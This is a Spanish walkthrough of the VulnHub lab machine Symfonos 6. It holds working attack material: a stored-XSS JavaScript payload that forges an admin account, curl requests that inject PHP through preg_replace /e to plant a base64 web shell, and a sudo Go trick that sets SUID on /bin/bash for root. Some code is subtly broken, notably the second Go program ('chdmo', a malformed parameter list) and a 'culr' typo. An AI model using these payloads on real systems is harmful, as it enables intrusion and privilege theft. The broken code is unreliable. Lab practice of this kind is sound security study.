---
title: "Symfonos 6"
date: 2025-11-03
draft: false
description: "Writeup de la máquina Symfonos 6 en VulnHub."
categories: ["VulnHub"]
tags: []
image: "/images/Symfonos6.png"
---

# Reconocimiento

Vamos a comenzar con un escaneo, con el objetivo de detectar la maquina victima con ayuda de **Arp-Scan**:

```bash
arp-scan -I ens33 --localnet --ignoredups
```

![img1](/img/Pasted%20image%2020250829174529.png)

Como podemos ver la IP de la maquina es `192.168.100.116`, ahora con ping vamos a realizar una petición para intentar descubrir que sistema es:

```bash
ping -c 1 192.168.100.116
```

![img2](/img/Pasted%20image%2020250829175424.png)

Como podemos observar tenemos un `ttl=64` lo que nos indica que es una maquina Linux.

En este punto vamos a comenzar con el escaneo de puertos con ayuda de **Nmap**:

```bash
nmap -p- --open -sS --min-rate 5000 -n -v -Pn 192.168.100.116 -oG allPorts
```

![img3](/img/Pasted%20image%2020250829175726.png)

Como podemos observar tenemos los puertos `22,80,3000,3306,5000` a los cuales les vamos a realizar un escaneo mucho mas exhaustivo:

```bash
nmap -p22,80,3000,3306,5000 -sCV 192.168.100.116 -oN target
```

![img4](/img/Pasted%20image%2020250829180032.png)

Podemos observar mucha información sobre los puerto abiertos así que vamos a analizar la información.

Vamos a comenzar a analizar todo y podemos comenzar por la web del puerto 80:
![img5](/img/Pasted%20image%2020250829180356.png)

![img6](/img/Pasted%20image%2020250829180409.png)
Podemos ver que nos dice que no perdamos el tiempo mirando o revisando esta web.

Vamos a revisar la web que corre por el puerto `3000`:
![img7](/img/Pasted%20image%2020250829180946.png)

vemos otra web en la cual podemos iniciar sesión pero en si no logramos ver nada mas.

Revisemos la otra web que esta corriendo el el puerto `5000` a ver si logramos encontrar algo:

![img8](/img/Pasted%20image%2020250829181304.png)

No podemos observar mucho, en este punto vamos a comenzar realizando fuzzing en la web que corre en el puerto `80`:

```bash
gobuster dir -u http://192.168.1.108 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -t 20
```

![img9](/img/Pasted%20image%2020250829210629.png)

Podemos ver dos directorios, el uso de `/posts` y el otro de `/flyspray` donde vamos a analizar los dos:
![img10](/img/Pasted%20image%2020250829210804.png)
Podemos observar dos webs la de `/posts` no tiene mas que texto y no se puede hacer mucho la verdad pero la de `flyspray`
vamos a analizarla para ver que mas podemos encontrar.

No logro ver nada totalmente grave en la web por lo que voy a registrarme y entrar a ver que logro encontrar:
![img11](/img/Pasted%20image%2020250829211702.png)

ya mi registre y ese es el panel vamos a ver que encontramos dentro del panel para ver si logramos listar o ver algo.

En realidad no encuentro nada por completo por lo que voy a intentar realizar fuzzing a este recurso para intentar encontrar algo que me sirva para ver versiones o información extra:

```bash
gobuster dir -u http://192.168.1.108/flyspray -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -t 20
```

![img12](/img/Pasted%20image%2020250829212342.png)

vemos muchas rutas pero la que primero me lista es la `docs` puede tener información del servicio así que vamos a revisarla:
![img13](/img/Pasted%20image%2020250829212427.png)
Como podemos observar tenemos muchos documentos de los cuales el de `UPGRADING.TXT` llama mi atención:
![img14](/img/Pasted%20image%2020250829212528.png)
En la primera línea podemos leer que al parecer el sistema se actualizo de la `0.9.9` a la `1.0`, esta información nos sirve mucho ya que con una versión establecida podemos ver si tenemos vulnerabilidades:

# Explotación

```bash
searchsploit flyspray
```

![img15](/img/Pasted%20image%2020250829212748.png)

podemos ver que si tenemos una vulnerabilidad conocida para la version `1.0.1` o menor por lo que vamos a ver que nos dice:

```bash
searchsploit -x php/webapps/2852.txt
```

![img16](/img/Pasted%20image%2020250829213209.png)
Esta vulnerabilidad no aplica pero tenemos otra que se encuentra mas arriba así que vamos a ver de que trata esa:

```bash
searchsploit -x php/webapps/41918.txt
```

![img17](/img/Pasted%20image%2020250829213443.png)

Vemos como todo esta extra detallado así que vamos a intentarlo:

Lo que nos explica es que el parámetro de `real_name` de un usuario es vulnerable a **Cross-Site Scripting XSS** ya que no esta correctamente configurado, lo que vamos a hacer en este caso primero será configurar directamente una etiqueta script que nos permita enviar una petición a nuestro servidor y ver si algún usuario nos envía una petición:

![img18](/img/Pasted%20image%2020250829215644.png)

Creamos la petición y lo vamos a guardar, ahora el punto es que este real name tiene que ser visible para algún usuario, para esto lo que vamos a hacer es enviar un mensaje al chat que tenemos en una de las tareas.

![img19](/img/Pasted%20image%2020250829215713.png)
Una vez que enviamos el mensaje se bloque por lo que ahora solo a modo de traza podemos ir al menu y desde nuestra maquina dejar corriendo un servidor en el puerto 80 con python y espera una petición:
![img20](/img/Pasted%20image%2020250829215855.png)

Perfecto si se esta ejecutando correctamente, en este punto lo que ser va a hacer es crear el archivo `pwned.js` y poner el código que nos proporciona el script ya que lo que va a intentar hacer es crear un usuario como administrador y en si el contenido quedaría de la siguiente manera:

```js
var tok = document.getElementsByName("csrftoken")[0].value;

var txt = '<form method="POST" id="hacked_form" action = "index.php?do=admin&area=newuser" > ';
txt += '<input type="hidden" name="action" value="admin.newuser"/>';
txt += '<input type="hidden" name="do" value="admin"/>';
txt += '<input type="hidden" name="area" value="newuser"/>';
txt += '<input type="hidden" name="user_name" value="hacker"/>';
txt += '<input type="hidden" name="csrftoken" value="' + tok + '"/>';
txt += '<input type="hidden" name="user_pass" value="12345678"/>';
txt += '<input type="hidden" name="user_pass2" value="12345678"/>';
txt += '<input type="hidden" name="real_name" value="root"/>';
txt += '<input type="hidden" name="email_address" value="root@root.com"/>';
txt += '<input type="hidden" name="verify_email_address" value="  root @root.com"/>';
txt += '<input type="hidden" name="jabber_id" value=""/>';
txt += '<input type="hidden" name="notify_type" value="0"/>';
txt += '<input type="hidden" name="time_zone" value="0"/>';
txt += '<input type="hidden" name="group_in" value="1"/>';
txt += "</form>";

var d1 = document.getElementById("menu");
d1.insertAdjacentHTML("afterend", txt);
document.getElementById("hacked_form").submit();
```

Vamos a dejar corriendo ya con el archivo nuestro servidor y vemos que es lo que logramos:
![img21](/img/Pasted%20image%2020250829220454.png)

Podemos observar que ya se realizo la petición por lo que vamos a ver si ya tenemos creado el usuario `hacker` y su contraseña `12345678`
![img22](/img/Pasted%20image%2020250830091029.png)

vemos que logramos entrar y además que tenemos otra tarea en la lista así que vamos a ver que nos dice esa tarea:
![img23](/img/Pasted%20image%2020250830091111.png)

Vemos que tenemos credenciales las cuales nos dice que es para la web de `gitea` por lo que vamos a intentar iniciar sesión con las credenciales `archilles` -> `h2sBr9gryBunKdF9`, recordemos que tenemos corriendo esa web en el puerto `3000`:
![img24](/img/Pasted%20image%2020250830091858.png)

Logramos entrar así que podemos comenzar a ver que tenemos en la web.
Logramos ver algunos repositorios pero uno llama a la primera la atención por el momento y es el de `symfonos-blog` el cual vamos a analizar ya que puede tener relación con el `/posts` que encontramos anteriormente:
![img25](/img/Pasted%20image%2020250830094930.png)

tenemos estos archivos pero no tenemos claro si se encuentran o no en `/posts` por lo que para asegurarnos primero vamos a realizar fuzzing para ver si logramos encontrar algo mas dentro de ese directorio:

```bash
gobuster dir -u http://192.168.1.108/posts/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 20
```

![img26](/img/Pasted%20image%2020250830095151.png)
Vemos que tenemos el directorio `includes` por lo que vamos aver si podemos obtener información:
![img27](/img/Pasted%20image%2020250830095227.png)
Podemos observar los mismos archivos por lo que efectivamente el proyecto de `symfonos-blog` es el que esta corriendo en `/posts` ahora en la web esos archivos no logramos verlos del todo, así que vamos a verlos dentro del proyecto buscando por información o credenciales validas:
![img28](/img/Pasted%20image%2020250830095500.png)

Podemos observar que tenemos ya un usuario y contraseña con lo que podemos intentar conectarnos mediate `mysql`:

```bash
mysql -u 'root' -D 'api' -h 192.168.1.108 -p
```

![img29](/img/Pasted%20image%2020250830095757.png)
El error en general nos dice que no puede conectares a la base de datos ya que la IP no esta autorizada.

Con esto ya descartamos el conectarnos de forma externa. en este punto vamos a revisar el `index.php` el cual parece ser el encargado de cargar el contenido de `/posts` :
![img30](/img/Pasted%20image%2020250830100015.png)
Podemos ver que se esta cargando contenido de una fila con nombre `text` y luego lo imprime por lo que el contenido debe estar almacenado en la base de datos.
Luego en la línea que estamos encerrando vemos que hace uso de `preg_replace()` donde primero creamos un regex para indicar por lo que queremos filtrar, luego le pasamos la cadena por la que se va a remplazar y el punto en lo que va a remplazar.

Lo que es alarmante es el uso del modificador `/e` ya que este modificador permite que se le inyecte código php por lo que en este punto lo que estamos buscando es alguna forma de modificar lo que se recupera de la base de datos en `$content` entonces tenemos que tratar de alterar esta información, con todo el código que hemos visto al parecer esta haciendo uso de una api y tenemos otro proyecto de `symfonos-api` por lo que conviene revisarlo y ver si logramos encontrar alguna cosa que nos permita cambiar la información de la base de datos.

![img31](/img/Pasted%20image%2020250830101050.png)

podemos ver toda la información dentro de la carpeta, así que vamos a investigar un poco y a comenzar a unir cabos:
![img32](/img/Pasted%20image%2020250830101130.png)
Vemos que main.go esta intentando conectarse por un puerto que esta en la Variable `PORT` vamos a ver si encontramos esa variable:
![img33](/img/Pasted%20image%2020250830101227.png)
Se encontraba en un archivo oculto llamado `.env` y vemos que nos lo dice en el mismo código de `main.go` que carga de `.env` las variables.
Ahora teniendo el puerto lo que tenemos que comenzar a hacer es intentar representar la url con la cual se realizan las peticiones y para lograr encontrarla tenemos que ir investigando dentro de la carpeta api y mirando su contenido:
![img34](/img/Pasted%20image%2020250830102036.png)
Vemos que tenemos una ruta relativa por lo cual vamos a comenzar a armar una url a ver que logramos algo:

```bash
culr -s -X GET "http://192.168.1.108/ls2o4g"
```

![img35](/img/Pasted%20image%2020250830102131.png)
Vemos que no tenemos respuesta por lo que vamos a continuar viendo ma a dentro ya que tenemos otra carpeta:
![img36](/img/Pasted%20image%2020250830102205.png)
Este es el archivo que se encuentra en la carpeta `v1.0` y que nos da dos rutas una de `/v1.0` y luego le concatena la `/ping` vemos si logramos ver que es lo que hace:

```bash
curl -s -X GET "http://192.168.1.108:5000/ls2o4g/v1.0/ping"
```

![img37](/img/Pasted%20image%2020250830102309.png)
Vemos que nos responde con un `pong` y si vemos el código en si ese ping entonces era el como nos iba a responder la web.

Estamos avanzando mucho pero aun no logramos el objetivo, si nos fijamos tenemos dos carpetas mas en ese directorio:

![img38](/img/Pasted%20image%2020250830102437.png)

vemos que tenemos una carpeta `auth` vamos a ver que podemos encontrar dentro de esta, en este punto vamos a analizarla:

![img39](/img/Pasted%20image%2020250830103446.png)
Como podemos observar nos habla primero de una ruta `/auth` a la por el método GET podemos pasarle `/check` y tendría que ser correcto.

```bash
curl -s -X GET "http://192.168.1.108:5000/ls2o4g/v1.0/auth/check"
```

![img40](/img/Pasted%20image%2020250830103607.png)

Ahora tenemos lo mismo por el método post, vamos a intentarlo a ver que conseguimos:

```bash
curl -s -X POST "http://192.168.1.108:5000/ls2o4g/v1.0/auth/login"
```

![img41](/img/Pasted%20image%2020250830103723.png)

Vemos que nos da correcto pero esto no nos proporciona nada así que lo que vamos a hacer es analizar el otro archivo que se en encuentra en esta ruta:
![img42](/img/Pasted%20image%2020250830105120.png)

Vemos que en el archivo al parecer se tiene que especificar un `username` y un `password` en formato json, así que por lógica creo que tenemos que enviar esos datos por post:

```bash
curl -s -X POST "http://192.168.1.108:5000/ls2o4g/v1.0/auth/login" -H "Content-Type: application/json" -d '{"username":"admin","password":"admin"}'
```

![img43](/img/Pasted%20image%2020250830121853.png)

Como podemos observar la petición se tramita pero en si no nos responde por lo que quiero creer que es necesario de credenciales validas , tomando esto en cuenta vamos a ver si con las credenciales de `achilles` nos responde algo:

```bash
curl -s -X POST "http://192.168.1.108:5000/ls2o4g/v1.0/auth/login" -H "Content-Type: application/json" -d '{"username":"achilles","password":"h2sBr9gryBunKdF9"}' | jq
```

![img44](/img/Pasted%20image%2020250830122128.png)
Vemos que logramos obtener su token y su id, esto por ahora no tiene mucho que nos sirva pero puede que mas luego se util por lo que lo guardamos en algún lado.

Ahora vamos a revisar la otra carpeta la de `posts` esta también tiene dos archivos donde uno es el siguiente:

![img45](/img/Pasted%20image%2020250830122936.png)
Como podemos observar en la ruta `/posts` vamos a poder realizar diferentes tipos de peticiones por diferentes métodos donde vamos a intentar por practicidad primero el método GET que quiero creer no necesita de datos extra:

```bash
curl -s -X GET "http://192.168.1.108:5000/ls2o4g/v1.0/posts/" | jq
```

![img46](/img/Pasted%20image%2020250830123127.png)
Excelente es el mismo mensaje que tenemos en la web de `posts`, vamos a intentar el otro método GET a ver que es lo que nos indica:

```bash
 curl -s -X GET "http://192.168.1.108:5000/ls2o4g/v1.0/posts/?id=1" | jq
```

![img47](/img/Pasted%20image%2020250830123326.png)

es la misma información indiferentemente del id que le pasemos, ya viendo que la web nos permite realizar peticiones veamos el otro archivo en busca de parámetros o requisitos de datos para los métodos `POST,DELETE,PATCH` del que en realidad mas me interesa es el `PATCH` la cual permite actualizar o modificar ciertas partes de los recursos en uso, con esto en cuenta vamos a ver primero el archivo:
![img48](/img/Pasted%20image%2020250830123717.png)

Tenemos esa función en cuenta ya que no dice que tenemos que tramitar data en `json` con el texto que queremos modificar quiero creer además de que nos piden el `id` lo que me llama la atención es que no tenemos ningún método con el que podamos definir un usuario y contraseña por lo que me lleva a pensar que o no lo necesita y cualquiera puede cambiar o tenemos que arrastrar un `token` de session como el que tenemos, vamos a probar primero sin el `token` y luego ya probamos con el token a ver que obtenemos:
![img49](/img/Pasted%20image%2020250830124611.png)
![img50](/img/Pasted%20image%2020250830124621.png)

vemos como se produce la petición pero la web no cambia, en este punto lo que vamos a hacer es arrastrar el `token` que se produjo con achilles:
![img51](/img/Pasted%20image%2020250830124807.png)

vemos que logramos hacerlos, esto es genial, si revisamos la web:
![img52](/img/Pasted%20image%2020250830124829.png)
Excelente, ahora recordemos que queríamos modificar este texto para aprovecharnos del modificador `/e` el cual nos permite inyectar comandos en php, y esto lo haremos de la siguiente manera:

```bash
curl -s -X PATCH "http://192.168.1.108:5000/ls2o4g/v1.0/posts/1" -H "Content-Type: application/json" -b 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTcxMzk1MTAsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.gSVAhsu_qoHdwGq0gOASuoenyB5IyDRj_gNapKJkPqg' -d $'{"text":"system(\'whoami\')"}'
```

![img53](/img/Pasted%20image%2020250830125110.png)

![img54](/img/Pasted%20image%2020250830125119.png)

Esto es genial, podemos ver que si se interpretan los comandos, el problema es que se puede complicar un poco el llamar una bash desde allí por lo que vamos a ver si nos permite mediante un comando en el mismo php crear un archivo dentro del directorio con el contenido de que le pasemos:

```bash
curl -s -X PATCH "http://192.168.1.108:5000/ls2o4g/v1.0/posts/1" -H "Content-Type: application/json" -b 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTcxMzk1MTAsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.gSVAhsu_qoHdwGq0gOASuoenyB5IyDRj_gNapKJkPqg' -d $'{"text":"file_put_contents(\'prueba.txt\',\'Archivo de prueba\')"}'
```

![img55](/img/Pasted%20image%2020250830132820.png)

Como vemos si se envió, vemos si podemos entrar en el:
![img56](/img/Pasted%20image%2020250830132846.png)

Podemos observar que lo hemos logrado, en este punto vamos a usar:
Vamos a usar un truco para evitar que por el estar escapando comillas de forma continua tengamos errores y es pasarle la cadena en bae64 del contenido que vamos a ingresar y con la función `base64_decode()` vamos a decodificar la cadena dejando el texto en el archivo en texto plano de la siguiente manera:

```bash
curl -s -X PATCH "http://192.168.1.108:5000/ls2o4g/v1.0/posts/1" -H "Content-Type: application/json" -b 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTcxMzk1MTAsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.gSVAhsu_qoHdwGq0gOASuoenyB5IyDRj_gNapKJkPqg' -d $'{"text":"file_put_contents(\'cmd.php\',base64_decode(\'PD9waHAKICBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsKPz4K\'))"}'
```

![img57](/img/Pasted%20image%2020250830133719.png)

Como vemos ya tenemos configurado esto de forma correcta y veamos si nos funciona:
![img58](/img/Pasted%20image%2020250830133749.png)
Ya podemos ejecutar comandos de forma excelente, ahora si vamos a generar nuestra reverse shell con bash:
![img59](/img/Pasted%20image%2020250830133853.png)
![img60](/img/Pasted%20image%2020250830133902.png)

# Escalada de Privilegios

Y estamos dentro, realicemos el tratamiento y dejemos todo listo para comenzar con el escaneo de la maquina para la escalada de privilegios:
![img61](/img/Pasted%20image%2020250830134025.png)

Listo vamos a comenzar a analizar por permisos SUID:

```bash
find \ -perm -4000 2>/dev/null
```

![img62](/img/Pasted%20image%2020250830134241.png)

veamos los usuario para ver si tenemos alguno que nos interese:

```bash
cat /etc/passwd | grep "sh$"
```

![img63](/img/Pasted%20image%2020250830134406.png)

Vemos que `achilles` también es un usuario por lo que podemos ver si se están reciclando credenciales:
![img64](/img/Pasted%20image%2020250830134457.png)

ya estamos como `achilles` ya que si se estaban reciclando credenciales, en este punto vamos a ver ahora con el usuario`achilles` si tenemos comandos a ejecutar como sudo:

```bash
sudo -l
```

![img65](/img/Pasted%20image%2020250830134636.png)

como podemos observar tenemos permisos para ejecutar como sudo y sin contraseña el binario de `/usr/local/go/bin/go`.

Para esto como no conocemos mucho del funcionamiento de go vamos a usar el siguiente código en `go` :

```go
package main

import (
    "fmt"
    "os/exec"
)

func execute(cmd string) {

    out, err := exec.Command(cmd).Output()

    if err != nil {
        fmt.Printf("%s", err)
    }

    fmt.Println("Command Successfully Executed")
    output := string(out[:])
    fmt.Println(output)
}

func main() {
    execute("ls")
}
```

Lo guardamos en un archivo y con el binario de go que nos permite ejecutar comandos con sudo sin passwd vamos ver que sucede:

```bash
/usr/local/go/bin/go run cmd.go
```

![img66](/img/Pasted%20image%2020250830135235.png)
como vemos si funciona en este punto lo que vamos a hacer es ver si podemos asignarles permisos de SUID a la bash modificando el código de la siguiente manera:

```go
package main

import (
    "fmt"
    "os/exec"
)

func execute(cmd string, arg1 string, arg2, string) {

    out, err := exec.Command(cmd, arg1, arg2).Output()

    if err != nil {
        fmt.Printf("%s", err)
    }

    fmt.Println("Command Successfully Executed")
    output := string(out[:])
    fmt.Println(output)
}

func main() {
    execute("chdmo" "+s" "/bin/bash")
}
```

```bash
sudo /usr/local/go/bin/go run cmd.go
```

![img67](/img/Pasted%20image%2020250830135844.png)

Se ejecuto revisemos los permisos de la bash a ver si lo logramos:
![img68](/img/Pasted%20image%2020250830135908.png)

Excelente vamos a subir a root:

```bash
bash -p
```

![img69](/img/Pasted%20image%2020250830140000.png)

Listo ya estamos como root, en este punto vamos a ver la flag final:
![img70](/img/Pasted%20image%2020250830140032.png)

Como podemos observar ya esta la Maquina. :)
